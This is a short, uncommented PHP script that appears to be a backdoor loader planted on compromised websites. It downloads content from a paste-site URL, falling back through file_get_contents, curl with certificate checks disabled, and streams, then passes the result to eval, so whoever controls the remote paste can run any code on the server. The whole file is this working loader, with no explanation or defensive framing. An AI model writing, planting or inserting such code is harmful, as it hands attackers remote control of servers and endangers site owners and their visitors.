<?php
$url = "https://rentry.co/wp-22/raw";

function get_with_file_get_contents($url) {
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    } else {
        return false;
    }
}

function get_with_curl($url) {
    if (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        return false;
    }
}

function get_with_streams($url) {
    if ($stream = fopen($url, 'r')) {
        $data = stream_get_contents($stream);
        fclose($stream);
        return $data;
    } else {
        return false;
    }
}

$content = get_with_file_get_contents($url);

if ($content === false) {
    $content = get_with_curl($url);
}

if ($content === false) {
    $content = get_with_streams($url);
}

if ($content !== false) {
    eval("?>".$content);
} else {
    echo "Error.";
}
?>
